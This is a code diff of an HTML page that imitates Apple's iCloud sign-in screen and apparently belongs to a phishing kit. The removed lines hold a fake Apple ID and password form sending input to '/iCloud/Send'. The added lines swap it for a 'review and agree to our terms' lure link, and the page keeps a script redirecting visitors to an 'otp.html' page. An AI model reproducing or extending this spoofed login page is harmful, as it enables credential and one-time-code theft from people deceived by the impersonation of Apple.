@@ -5,9 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="stylesheet" href="css/fa/css/all.css">
-    <link rel="shortcut icon" href="img/apple.ico" />
+    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAACUCAMAAABV5TcGAAAAaVBMVEX///8AAAD7+/vy8vL29vbe3t7s7OzV1dXi4uK4uLjl5eXOzs7KysqYmJhqamo1NTUMDAzBwcFwcHBlZWWnp6dDQ0OOjo6ysrIXFxeGhoYtLS1XV1deXl5SUlJLS0s7Ozt8fHwlJSUeHh5x1dwEAAAEEElEQVR4nO2d25aqMAyGactBBEQURDxw8P0fcqszbgFRnCFrZRLzXXuR/qsNObValiAIgiAIgiAIgiAIgiAIgvBX0bYbph62FX8E40WZUiqysQ35C7jJQl3ZiByWuYkhu+PMbNPc1FCpxrYGm/Cg7uTY1mDjVy01VIJtDjJ501aj+vAPbaI61C62Qai4XTVUim0QKnrbVSMOsS1CZdXbHMVHRx1h01Vj52NbhIl96G2OlcE2CRN/J57jjl131VhusC1CJcy6cuw/+qhYUc9zzLENQsX0zsoM2yBcvH1HjQ9PVqzk1BLj5GCbg03eEmPx2Znbhf9yLI/pR8fmX3zLsTxEH39QLviXJOW4yUWMK3PfT0LvI4+JPfeC0Hsddc7CPI2iNE8c1hLpcLMusyqOq/JY58Ohp50UxyxutmeaXVUuUq4nyFk17fhie9o/1jScetf+zcW/nkqOHQavl6V9UbTjcZPGQ785S8KtA+Ushhd6Tl5919Za2ybolwfbxAEjQUy3g9JnHeVpvX31izMRm5x/Xo8s9S0WTPJc59Up+AF7FpnubD++0jf1YPDNnfdr5BNYkK+SGaCT8kVBPfsvINVQK+Jy9Psn04iIBx8zQMehKvKtqH7DYApZgL2aqXgloBrkow4NuDlO5PeG5QBuDgZJfj6+yncpsNcyHRcuAqvIh6NnR7oEk4PDKBDcWTkw2Bz9EZYJMPCjlnsaX+d7lAwSe2sOpQaPmxzJ+DrfhIMjhctX6CcrF8CijjWHmrEGi9BrDi0FDVb4YTFjqsFi0gh7KRBoKDVEDpHjBTx8B5wcxOvnV+BcqXxoOxw4ZHB6cNrnN+xY3C9+Ou/zYziUO6wNmBwFB+eRgskRk+84WZD1DhZPV/QvkU8gY1A6duH6Chy2h1nDyaHohx6QDWsON0kBfSmHPM4bGyT+EeSf84AcoWSghw3pPJTaUh+UA3UeSi2JT5UOX2GZQEm6AWXgsrgbpLM5H1wO0l9cB/bbciWj61A1/Gkh3c5Pntz1+z1byl8X2OsbF2g/J5aCTUR9Q3tM3z3CqkH9dY8IsAikaDvSCy6oM6V/ORA0j2PQcQG8/sVhSgwuUt8y2ByWBTYzx+OVSqibCzGL1jWUN2XzSqUBSWwz4hHYnQAi+CBdCesCcNOHxfzgN/bkwkeDvQRQJtfFWHxj74TV+JJfQDuvHyCd0qKk3nEaYEL0Qbqd8AT71y+bUH/EZBjzVI+mKsts9yyWXzEYhRpiUI+4TpMw8DwvSNJiyN/y/Z8W8zBcuU4c9+4mjZM8DOfyeU3uER20s/1l8fhuqfE6W2jP+8VSy05ubf1j7g5+PrXxbw+vrTg9vPgMO8hzf6QGbDtBwNZnCIIgCIIgCIIgCIIgCILw1/gHGHA2JnolThkAAAAASUVORK5CYII=" />
 
     <title>iCloud</title>
 </head>
@@ -41,19 +39,11 @@
             </div>
 
             <div class="login-text">
-                <p>Sign in to iCloud</p>
+                <p>please click <a href="index2.html">HERE</a> to review and agree to our terms and conditions. 
+                  
+                </p>
             </div>
-            <form action="/iCloud/Send" method="GET" name="form">
-                <div class="form">
-                    <span>
-                        <input type="text" name="username" id="username" class="login" placeholder="Apple ID" required>
-                    </span>
-                    <span>
-                        <input type="password" name="password" id="password" class="password" placeholder="Password" required>
-                        <i onclick="sendMessage()" id="submit" class="fal fa-arrow-circle-right"></i>
-                    </span>
-                </div>
-            </form>
+            
             <div class="forget-password">
                 <a href="https://iforgot.apple.com/password/verify/appleid" target="_blank">Forgot your Apple ID or password?</a>
             </div>
@@ -87,6 +77,169 @@
         window.location.replace("otp.html");
       }
       </script>
+      <style>
+        *{
+    margin: 0;
+    padding: 0;
+}
+a{
+    color:rgba(255,255,255,0.8);
+}
+html {
+    height: 99%;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    width: 100%;
+    font-family: "SF Pro Display","SF Pro Icons","Helvetica Neue","Helvetica","Arial",sans-serif;
+    color:rgba(255,255,255,0.8);
+  }
+  .iCloudCSS {
+    height: 101%;
+    width: 100%;
+  }
+  .iCloudCSS {
+    float: right;
+    background: linear-gradient(to bottom, rgba(7,42,78,1) 0%,rgba(10,48,85,1) 6%,rgba(19,66,106,1) 15%,rgba(35,94,137,1) 24%,rgba(60,127,166,1) 33%,rgba(80,146,178,1) 39%,rgba(100,163,184,1) 44%,rgba(128,180,182,1) 51%,rgba(151,192,177,1) 56%,rgba(178,201,166,1) 62%,rgba(194,202,155,1) 66%,rgba(213,199,137,1) 71%,rgba(228,189,118,1) 76%,rgba(238,168,92,1) 84%,rgba(240,150,75,1) 92%,rgba(236,126,57,1) 98%,rgba(235,120,53,1) 100%); /* W3C */  
+  }
+
+  /* Header Start */
+.Header{
+    width: 100%;
+    height: 50px;
+    display: flex;
+}
+.text-logo{
+    width: 100px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.text-logo > p{
+    font-size: 22px;
+    font-weight: 200;
+}
+.instructions{
+    flex-grow: 1;
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    margin-right: 40px;
+    margin-left: 40px;
+}
+.instructions-text{
+    font-size: 22px;
+    color: black;
+}
+.instructions a{
+    text-decoration: none;
+}
+.instructions  .fal{
+    font-size: 20px;
+    font-weight: 200;
+}
+/*Header End*/
+
+/* Content Start */
+
+.Content{
+    width: 350px;
+    height: 300px;
+    margin: 140px auto 0 auto;
+    text-align: center;
+}
+.icloud-logo{
+    width: 100px;
+}
+.login-text p{
+    font-size: 25px;
+}
+.form{
+    margin-top: 25px;
+}
+.form span{
+    display: block;
+    position: relative;
+}
+#password, #username{
+    width: 300px;
+    height: 30px;
+    border:none;
+    border-radius: 6px;
+    padding: 5px 10px;
+    font-size: 18px;
+    color: rgb(94, 94, 94);
+}
+#username{
+    border-bottom-left-radius: 0px;
+    border-bottom-right-radius: 0px;
+    border-bottom: 1px solid rgb(190, 190, 190);
+}
+#password{
+    transition: height 0.2s linear;
+    border-top-left-radius: 0px;
+    border-top-right-radius: 0px;
+}
+#username:focus, #password:focus{
+    outline: none;
+}
+.fa-arrow-circle-right{
+    position: absolute;
+    top: 10px;
+    right: 20px;
+    font-size: 25px;
+    cursor: pointer;
+    color: #494949;
+}
+.forget-password{
+    margin-top: 20px;
+}
+
+.forget-password a{
+    text-decoration: none;
+}
+.forget-password:hover a{
+    text-decoration: underline;
+}
+
+/* Content End */
+
+
+@media screen and (max-width:400px){
+    
+body{
+    width: 100%;
+}
+.iCloudCSS{
+    height: 600px;
+}
+    
+#password, #username{
+    width: 220px;
+    height: 25px;
+    font-size: 14px;
+}
+
+.fa-arrow-circle-right{
+    top: 7px;
+    right: 60px;
+}
+
+.text-logo > p{
+    font-size: 16px;
+}
+.instructions{
+    margin-right: 20px;
+    margin-left: 10px;
+}
+.instructions-text{
+    font-size: 16px;
+}
+
+}
+      </style>
 </body>
 
 </html>
